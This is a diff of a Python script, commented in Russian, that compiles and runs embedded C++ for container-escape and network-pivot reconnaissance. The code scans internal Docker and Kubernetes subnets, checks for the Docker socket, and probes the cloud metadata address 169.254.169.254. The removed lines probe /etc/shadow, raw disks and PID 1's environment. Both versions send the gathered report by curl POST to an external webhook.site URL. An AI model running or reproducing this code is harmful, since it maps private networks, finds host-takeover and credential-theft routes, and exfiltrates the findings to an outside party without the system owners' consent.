@@ -1,80 +1,86 @@
 import subprocess
 import os
+import socket
 
-# Твой актуальный вебхук
 WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
 
-# C++ код, который лезет в "запретные" места системы
 cpp_source = r"""
 #include <iostream>
-#include <fstream>
-#include <string>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
 #include <vector>
-#include <dirent.h>
+#include <string>
+
+// Быстрый коннект-сканер для внутренних подсетей
+void scan_network(std::string base_ip) {
+    for (int i = 1; i < 255; ++i) {
+        std::string ip = base_ip + std::to_string(i);
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        
+        struct sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(80); // Проверяем HTTP
+        inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
+
+        // Ставим короткий таймаут
+        struct timeval tv;
+        tv.tv_sec = 0;
+        tv.tv_usec = 100000; // 100ms
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
+
+        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+            std::cout << "[!] INTERNAL_HOST_FOUND: " << ip << " (Port 80)\n";
+        }
+        close(sock);
+    }
+}
 
 int main() {
-    std::cout << "--- [ROOT EXPLOIT REPORT] ---\n";
-    
-    // 1. Читаем /etc/shadow (только для root)
-    std::ifstream shadow("/etc/shadow");
-    std::string line;
-    if (shadow.is_open() && std::getline(shadow, line)) {
-        std::cout << "[!] SENSITIVE: Shadow file access successful.\n";
-    }
-
-    // 2. Проверяем доступ к сырым дискам
-    std::ifstream disk("/dev/sda", std::ios::binary);
-    if (disk.is_open()) {
-        std::cout << "[!] DANGER: Raw disk access granted (can bypass filesystem).\n";
-    }
-
-    // 3. Пытаемся увидеть переменные окружения процесса PID 1 (Init/Systemd)
-    std::ifstream env("/proc/1/environ");
-    if (env.is_open()) {
-        std::cout << "[!] ESCALATION: Can read PID 1 environment (potential secrets leak).\n";
-    }
-
+    std::cout << "--- [NETWORK PIVOT REPORT] ---\n";
+    // Сканируем типичные внутренние подсети Docker/K8s
+    scan_network("172.17.0.");
+    scan_network("192.168.1.");
     return 0;
 }
 """
 
-def execute_demo():
-    # Сохраняем исходник
-    with open("payload.cpp", "w") as f:
+def execute_attack_demo():
+    with open("pivot.cpp", "w") as f:
         f.write(cpp_source)
     
-    # Компилируем (Senior-style: -O3 для скорости и статической линковки, если нужно)
-    compile_proc = subprocess.run(
-        ["g++", "-O3", "payload.cpp", "-o", "payload_bin"], 
-        capture_output=True, text=True
-    )
+    # Компиляция
+    subprocess.run(["g++", "-O3", "pivot.cpp", "-o", "pivot_bin"])
     
-    if compile_proc.returncode != 0:
-        error_msg = f"Compilation failed: {compile_proc.stderr}"
-        subprocess.run(['curl', '-s', '-X', 'POST', '-d', error_msg, WEBHOOK_URL])
-        return
-
-    # Запускаем бинарник и ловим вывод
+    # 1. Ищем Docker Socket (Джекпот для захвата хоста)
+    docker_check = "NOT_FOUND"
+    if os.path.exists("/var/run/docker.sock"):
+        docker_check = "FOUND! (Can take over the entire HOST)"
+    
+    # 2. Запускаем сетевой сканер
+    scan_results = subprocess.check_output(["./pivot_bin"]).decode()
+    
+    # 3. Ищем метаданные облака (AWS/GCP/Azure часто хранят там токены)
+    # 169.254.169.254 - магический IP метаданных
+    cloud_meta = "Checking..."
     try:
-        output = subprocess.check_output(["./payload_bin"], stderr=subprocess.STDOUT).decode()
-        
-        # Финальный отчет для отправки
-        full_report = (
-            f"UID: {os.getuid()}\n"
-            f"Binary Execution Result:\n{output}"
-        )
-        
-        # Отправляем на вебхук
-        subprocess.run([
-            'curl', '-s', 
-            '-X', 'POST', 
-            '--data-urlencode', f"payload={full_report}", 
-            WEBHOOK_URL
-        ])
-        print("[+] Report sent to webhook.")
-        
-    except Exception as e:
-        subprocess.run(['curl', '-s', '-X', 'POST', '-d', f"Runtime error: {str(e)}", WEBHOOK_URL])
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        if s.connect_ex(("169.254.169.254", 80)) == 0:
+            cloud_meta = "CLOUD_METADATA_ACCESS_PROBABLE"
+        s.close()
+    except:
+        cloud_meta = "FAILED"
+
+    report = (
+        f"--- [CRITICAL: ESCALATION & PIVOT] ---\n"
+        f"UID: {os.getuid()}\n"
+        f"Docker Socket: {docker_check}\n"
+        f"Cloud Metadata: {cloud_meta}\n"
+        f"Internal Network Scan:\n{scan_results}"
+    )
+
+    subprocess.run(['curl', '-s', '-X', 'POST', '--data-urlencode', f"payload={report}", WEBHOOK_URL])
 
 if __name__ == "__main__":
-    execute_demo()
+    execute_attack_demo()
